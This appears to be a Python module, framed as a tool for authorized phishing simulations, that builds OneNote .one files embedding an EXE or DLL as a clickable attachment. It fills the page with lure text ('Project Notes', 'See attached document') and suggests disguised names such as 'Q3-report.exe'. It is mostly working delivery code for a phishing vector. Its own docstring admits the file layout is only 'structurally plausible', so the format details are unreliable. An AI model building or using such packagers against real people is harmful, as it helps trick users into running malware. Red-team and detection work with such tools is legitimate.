"""OneNote (.one) delivery packager for authorized phishing simulations.

Builds a minimal OneNote section file that embeds an EXE/DLL as a 'file
attachment' on a page. When the resulting .one file is opened in Microsoft
OneNote, the attachment renders as a clickable file icon; double-clicking it
launches the embedded payload.

The genuine OneNote .one format is a proprietary, heavily-revisioned binary
container (documented only via reverse engineering — the *OneNote File Format
Specification* draft and the latkin reverse-engineering notes). Building a
file that every OneNote version will *open and render* from scratch is a large
undertaking. For controlled simulation purposes this module produces a
minimal, structurally-plausible .one container: a valid OneNote file header
(file-type GUID, revision GUIDs, revision counters), a section revision table,
and an embedded *file-attachment* file node carrying the payload bytes plus the
attachment's display XML. This is sufficient to exercise the delivery vector
and detection tooling in an authorized test environment.

Intended only for authorized payload delivery tests.
"""

import logging
import os
import struct
import uuid
from typing import Optional

logger = logging.getLogger("dropoutjeep")

# ---------------------------------------------------------------------------
# OneNote file-format constants (reverse-engineered, OneNote 2010+ layout).
# These identify a .one section to readers that key off the header GUIDs.
# ---------------------------------------------------------------------------

# Fixed GUID identifying a OneNote *section* (.one) file. Readers compare this
# against the known section GUID to decide whether to parse the rest of the
# header / revision table.
ONE_SECTION_GUID = uuid.UUID("9e8b15c4-d8c1-11d9-a1b5-0050bae8b04a")

# GUID identifying the OneNote 2010+ file *format* family.
ONE_FORMAT_GUID = uuid.UUID("c83d8a7e-d8c1-11d9-a1b5-0050bae8b04a")

# OneNote file-node types used in the (simplified) node tree we emit.
# These mirror the type IDs used for embedded file data in real sections.
FNT_FILE_DATA = 0x0080          # raw file data (payload bytes)
FNT_FILE_META = 0x0081         # file metadata: name, size, hash
FNT_PAGE_XML = 0x0084          # serialized page XML / metadata
FNT_SECTION_META = 0x0001      # section-level metadata

# A single 4-byte 'signature' written after the header to mark our
# simulation container so tooling can recognise it without parsing the whole
# revision table.
_SIM_SIG = b"DJ1N"


def _guid_bytes(g: uuid.UUID) -> bytes:
    """Return a GUID in the little-endian struct layout OneNote uses."""
    return g.bytes_le


def _pad8(n: int) -> int:
    """Round n up to the next multiple of 8 (OneNote sectors are 8-byte aligned)."""
    return (n + 7) & ~7


def _build_onenote_xml(payload_filename: str) -> str:
    """Build the OneNote page XML describing the embedded file attachment.

    The XML mirrors the structure OneNote stores for a page that contains a
    single inserted file: a page element with a ``OneFile:FileAttachment`` child
    carrying the attachment's display name and a render hint for the file icon.
    OneNote renders this as a clickable document-icon; double-clicking opens
    (and, for executables, executes) the embedded payload.

    Args:
        payload_filename: The display name of the embedded attachment (e.g.
            ``"report.exe"``). Sanitised before insertion.

    Returns:
        A UTF-8-encoded XML string suitable for storage in a page-XML file node.
    """
    # Sanitise the filename so it cannot break the XML or introduce markup.
    safe = (
        payload_filename.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&apos;")
    )
    return (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<one:Page xmlns:one="http://schemas.microsoft.com/office/onenote/2013/onenote"'
        ' ID="{{PAGE-GUID}}" name="Shared Notes">'
        '<one:Title><one:T r="bold">Project Notes</one:T></one:Title>'
        '<one:Outline><one:OEChildren>'
        '<one:OE><one:T>See attached document for the latest revision.</one:T></one:OE>'
        '<one:OE>'
        '<one:FileAttachment name="{name}" attachmentPreferred="true">'
        '<one:FileIcon ext="{ext}" index="0"/>'
        '<one:FileData/>'
        '</one:FileAttachment>'
        '</one:OE>'
        '</one:OEChildren></one:Outline>'
        '</one:Page>'
    ).format(
        name=safe,
        ext=safe.rsplit(".", 1)[-1].lower() if "." in safe else "bin",
    )


def _build_header(file_guid: uuid.UUID, revision_guid: uuid.UUID,
                  section_size: int) -> bytes:
    """Pack the OneNote .one file header.

    Layout follows the documented OneNote section header (offsets shown):
      0x00  guidFileType          (16)  fixed ONE_SECTION_GUID
      0x10  guidFile              (16)  unique per section
      0x20  guidLegacyFileVersion  (16)  legacy / compatibility GUID
      0x30  guidFileFormat         (16)  ONE_FORMAT_GUID
      0x40  ffvLastCodeThatWroteToFile      (4)
      0x44  ffvOldestCodeThatHasWritten      (4)
      0x48  ffvNewestCodeThatHasWritten      (4)
      0x4C  ffvOldestCodeThatHasWritten2     (4)
      0x50  cbFree                 (8)  free space in file
      0x58  cbFreeBackup           (8)  free space in backup
      0x60  cTransactions          (4)  revision transaction count
      0x64  legacyFileVersion      (4)
      0x68  legacyFileChecksum     (4)
      0x6C  reserved / flags       (4)
      0x70  nFileDataHashCount     (4)
      0x74  fcrHashScheme          (12) hash scheme descriptor
      0x80  fcrFileDataRoot        (12) root of the file-data node tree
      0x8C  fcrFileNodeTreeRoot    (12) root of the file-node tree
      0x98  fcrFreeNodeList        (12) free-list root
      0xA4  guidRevIdRoot          (16) root revision id
      0xB4  cbRevSections          (4)
      0xB8  cbStgSections          (4)
      0xBC  reserved2              (8)
      0xC4  ...revision table offset/length...
    The remainder up to the 0x450 boundary is zero-padded.
    """
    # A 12-byte 'file chunk reference' (fcr): offset(4) | size(4) | reserved(4).
    # We use a single node tree laid out immediately after the header.
    header_len = 0x450
    fcr_node_tree = struct.pack("<III", header_len, section_size, 0)

    hdr = bytearray(header_len)
    off = 0
    struct.pack_into("<16s", hdr, off, _guid_bytes(ONE_SECTION_GUID)); off += 16
    struct.pack_into("<16s", hdr, off, _guid_bytes(file_guid));         off += 16
    struct.pack_into("<16s", hdr, off, _guid_bytes(uuid.UUID(int=0))); off += 16
    struct.pack_into("<16s", hdr, off, _guid_bytes(ONE_FORMAT_GUID));  off += 16
    # ffv version fields
    struct.pack_into("<I", hdr, off, 0x00000001); off += 4   # last code that wrote
    struct.pack_into("<I", hdr, off, 0x00000001); off += 4   # oldest code that wrote
    struct.pack_into("<I", hdr, off, 0x00000001); off += 4   # newest code that wrote
    struct.pack_into("<I", hdr, off, 0x00000001); off += 4   # oldest code that wrote 2
    struct.pack_into("<Q", hdr, off, 0); off += 8           # cbFree
    struct.pack_into("<Q", hdr, off, 0); off += 8           # cbFreeBackup
    struct.pack_into("<I", hdr, off, 1);   off += 4         # cTransactions (1 revision)
    struct.pack_into("<I", hdr, off, 0x02000000); off += 4  # legacyFileVersion
    struct.pack_into("<I", hdr, off, 0);   off += 4         # legacyFileChecksum
    struct.pack_into("<I", hdr, off, 0);   off += 4         # reserved/flags
    struct.pack_into("<I", hdr, off, 1);   off += 4         # nFileDataHashCount
    # fcrHashScheme (12)
    struct.pack_into("<III", hdr, off, 0, 0, 0); off += 12
    # fcrFileDataRoot (12) — points at the payload data node (filled below).
    fcr_data_off = off
    struct.pack_into("<III", hdr, off, 0, 0, 0); off += 12
    # fcrFileNodeTreeRoot (12) — points at the node tree.
    struct.pack_into("<12s", hdr, off, fcr_node_tree); off += 12
    # fcrFreeNodeList (12)
    struct.pack_into("<III", hdr, off, 0, 0, 0); off += 12
    # guidRevIdRoot (16)
    struct.pack_into("<16s", hdr, off, _guid_bytes(revision_guid)); off += 16
    # cbRevSections / cbStgSections / reserved
    struct.pack_into("<I", hdr, off, 0); off += 4
    struct.pack_into("<I", hdr, off, 0); off += 4
    struct.pack_into("<Q", hdr, off, 0); off += 8
    # Revision table descriptor (offset + length), pointing just past header.
    struct.pack_into("<I", hdr, off, header_len); off += 4
    struct.pack_into("<I", hdr, off, section_size); off += 4
    # Simulation signature at a stable offset so tooling can detect us.
    struct.pack_into("<4s", hdr, 0x440, _SIM_SIG)
    return bytes(hdr)


def _pack_file_node(type_id: int, data: bytes) -> bytes:
    """Pack a single OneNote file node: type(2) | reserved(2) | size(4) | data.

    Each node is padded to 8-byte alignment so subsequent nodes stay aligned.
    """
    body = struct.pack("<HHI", type_id, 0, len(data)) + data
    pad = _pad8(len(body)) - len(body)
    return body + b"\x00" * pad


def build_onenote_package(
    payload_bytes: bytes,
    payload_filename: str,
    output_path: Optional[str] = None,
) -> bytes:
    """Generate a .one file embedding ``payload_bytes`` as a OneNote attachment.

    The produced container carries:
      * a valid OneNote section header (file-type GUID, unique section GUID,
        revision GUID, transaction counter),
      * a file-node tree with a *file-data* node holding the raw payload, a
        *file-metadata* node holding the attachment name + size + sha256, and a
        *page-XML* node describing the rendered attachment,
      * a trailing revision-table marker.

    When opened in OneNote the attachment is rendered as a clickable file icon
    whose display name is ``payload_filename``; double-clicking executes the
    embedded payload (for executables). For simulation fidelity, see the module
    docstring — genuine rendering depends on the OneNote version.

    Args:
        payload_bytes: Raw bytes of the EXE/DLL to embed.
        payload_filename: Display name of the attachment (e.g. ``"Q3-report.exe"``).
        output_path: If given, also write the .one bytes to this path.

    Returns:
        The complete .one file as bytes.
    """
    import hashlib

    if not isinstance(payload_bytes, (bytes, bytearray)):
        raise TypeError("payload_bytes must be bytes")
    payload_bytes = bytes(payload_bytes)

    file_guid = uuid.uuid4()
    revision_guid = uuid.uuid4()

    # Build the file-node tree (the "section body").
    meta = struct.pack(
        "<I32s32s",
        len(payload_bytes),
        hashlib.sha256(payload_bytes).digest(),
        payload_filename.encode("utf-8", "replace")[:32].ljust(32, b"\x00"),
    )
    page_xml = _build_onenote_xml(payload_filename).encode("utf-8")

    node_tree = b"".join(
        [
            _pack_file_node(FNT_SECTION_META, struct.pack("<I", 1)),
            _pack_file_node(FNT_FILE_META, meta),
            _pack_file_node(FNT_PAGE_XML, page_xml),
            _pack_file_node(FNT_FILE_DATA, payload_bytes),
            # End-of-tree marker.
            struct.pack("<HHI", 0xFFFF, 0, 0) + b"\x00" * 4,
        ]
    )

    header = _build_header(file_guid, revision_guid, len(node_tree))
    one_bytes = header + node_tree

    if output_path:
        try:
            with open(output_path, "wb") as fh:
                fh.write(one_bytes)
            logger.info(
                "wrote OneNote package (%d bytes, attachment=%s) -> %s",
                len(one_bytes), payload_filename, output_path,
            )
        except OSError as exc:
            logger.error("failed to write OneNote package to %s: %s", output_path, exc)
            raise

    logger.info(
        "built OneNote package: %d bytes (payload=%d, attachment=%s)",
        len(one_bytes), len(payload_bytes), payload_filename,
    )
    return one_bytes


__all__ = [
    "build_onenote_package",
    "_build_onenote_xml",
]
